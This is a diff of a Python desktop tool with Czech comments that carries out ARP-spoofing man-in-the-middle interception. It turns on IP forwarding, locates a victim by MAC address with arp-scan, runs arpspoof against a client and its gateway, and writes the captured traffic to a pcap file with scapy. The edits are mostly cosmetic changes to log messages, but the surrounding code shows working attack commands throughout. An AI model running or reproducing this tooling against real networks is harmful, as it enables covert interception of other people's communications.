@@ -29,10 +29,10 @@ def start_forwarding():
     try:
         # Zapne přeposílání paketů
         command = "sysctl net.ipv4.ip_forward=1"
-        print("COMMAND: " + command)
+        print("COMMAND: " + command + "\n")
 
         subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
-        print(f"        -- Přeposílání paketů bylo úspěšně zapnuto.")
+        print(f"     -- Přeposílání paketů bylo úspěšně zapnuto.\n")
 
         #global forwarding_on_button
         #global forwarding_off_button
@@ -45,23 +45,23 @@ def start_forwarding():
         arp_spoofing_frame.configure(fg_color=global_names.my_color) 
 
     except subprocess.CalledProcessError as e:
-        print(f"Chyba při zapínání přeposílání paketů: {e}")
+        print(f"Chyba při zapínání přeposílání paketů: {e}\n")
 # ========================================================================================================================
 def stop_forwarding():
     print("===== STOP FORWARDING TRAFFIC =====================")
     try:
         # Zapne přeposílání paketů
         command = "sysctl net.ipv4.ip_forward=0"
-        print("COMMAND: " + command)
+        print("COMMAND: " + command + "\n")
 
         subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)        
-        print(f"        -- Přeposílání paketů bylo úspěšně vypnuto.")
+        print(f"     -- Přeposílání paketů bylo úspěšně vypnuto.\n")
 
         forwarding_off_button.configure(state=DISABLED) 
         forwarding_on_button.configure(state=NORMAL)
     except subprocess.CalledProcessError as e:
 
-        print(f"Chyba při vypínání přeposílání paketů: {e}")
+        print(f"Chyba při vypínání přeposílání paketů: {e}\n")
 # ========================================================================================================================
 def find_ip_by_mac(mac_address, interface):
 
@@ -70,7 +70,12 @@ def find_ip_by_mac(mac_address, interface):
     try:
         # Run arp-scan on the specified interface
         result = subprocess.check_output(['sudo', 'arp-scan', '--interface', interface, '--localnet'], text=True)
-        
+        #arp_result = subprocess.check_output(['arp', '-n'], encoding='utf-8')
+    except subprocess.CalledProcessError as e:
+        print("Nastala chyba při získávánáí MAC adresy:" + e + "\n")
+        return 1
+    
+    try:
         # Iterate through each line of the output
         for line in result.splitlines():
             # Check if the current line contains the MAC address
@@ -79,7 +84,7 @@ def find_ip_by_mac(mac_address, interface):
                 ip_address = line.split()[0]
                 return ip_address
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"Nastala chyba: {e}\n")
         return None
 
 # ========================================================================================================================
@@ -88,9 +93,6 @@ def start_arp_spoofing(interface, cl):
     try:
         interface = global_names.interface
         cl = global_names.cl
-
-        #print("=== DEBUG: Interface: " + interface)
-        #print("=== DEBUG: CL: " + cl)
 
         command = "ip route | grep default"
         print("COMMAND: " + command)
@@ -114,7 +116,7 @@ def start_arp_spoofing(interface, cl):
         arpspoof_cl_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
 
         command = f"sudo arpspoof -i {interface} -t {ap_ip} {client_ip}"
-        print("COMMAND: " + command)
+        print("COMMAND: " + command + "\n")
         global arpspoof_ap_process 
         arpspoof_ap_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
 
@@ -131,9 +133,9 @@ def start_arp_spoofing(interface, cl):
         capturing_frame.configure(fg_color=global_names.my_color) 
 
 
-        print(f"        -- ARP spoofing byl úspěšně spuštěn.")
+        print(f"     -- ARP spoofing byl úspěšně spuštěn.\n")
     except subprocess.CalledProcessError as e:
-        print(f"Chyba při zapínání ARP spoofingu: {e}")
+        print(f"Chyba při zapínání ARP spoofingu: {e}\n")
 # ========================================================================================================================
 def stop_arp_spoofing():
     print("===== STOP ARP SPOOFING ===================================")
@@ -158,17 +160,15 @@ def stop_arp_spoofing():
     arp_spoofing_on_button.configure(state=NORMAL) 
     arp_spoofing_off_button.configure(state=DISABLED) 
     
-    print(f"        --ARP spoofing byl úspěšně zastaven.")
+    print(f"     --ARP spoofing byl úspěšně zastaven.\n")
 
 # ========================================================================================================================
 def capture_packets(interface, output_traffic):
     #global output_traffic
-    print("     -- OUTPUT TRAFFIC FILE: " + output_traffic)
+    print("     -- Soubor se zachycennou komunikací: " + output_traffic)
     t = AsyncSniffer(iface=interface, prn=lambda x: wrpcap(output_traffic, x, append=True))
-    #t = AsyncSniffer(iface=interface, offline=output_traffic, prn=lambda x: wrpcap(output_traffic, x, append=True))
     
     global capturing
-    #print(str(capturing))
     while capturing:
         t.start()
         time.sleep(1)
@@ -197,7 +197,7 @@ def start_capturing():
         next_menu_button.configure(state=NORMAL)
         
     except subprocess.CalledProcessError as e:
-        print(f"Chyba při zapínání zachytávání paketů: {e}")
+        print(f"Chyba při zapínání zachytávání paketů: {e}\n")
 # ========================================================================================================================
 def stop_capturing():
     print("===== STOP CAPTURING TRAFFIC ==============================")
@@ -206,7 +206,7 @@ def stop_capturing():
     capturing = False
     if capturing_process:
         os.killpg(os.getpgid(capturing_process.pid), signal.SIGTERM)
-        print("     -- Process Zachytávání datového trafiku byl zastaven.")
+        print("     -- Process Zachytávání datového trafiku byl zastaven.\n")
 
     capturing_off_button.configure(state=DISABLED) 
     capturing_on_button.configure(state=NORMAL)
@@ -285,7 +285,6 @@ def draw_arp_spoof(window):
 
     global capturing_on_button
     global capturing_off_button
-    #capturing_on_button = ctk.CTkButton(capturing_frame, text="Zapnout", width= 20, command=lambda: start_capturing(interface, output_traffic))
     capturing_on_button = ctk.CTkButton(capturing_frame, text="Zapnout", width= 200, command=start_capturing)
     capturing_on_button.grid(row=1, column=0, padx=5, pady=5, sticky=W)
 
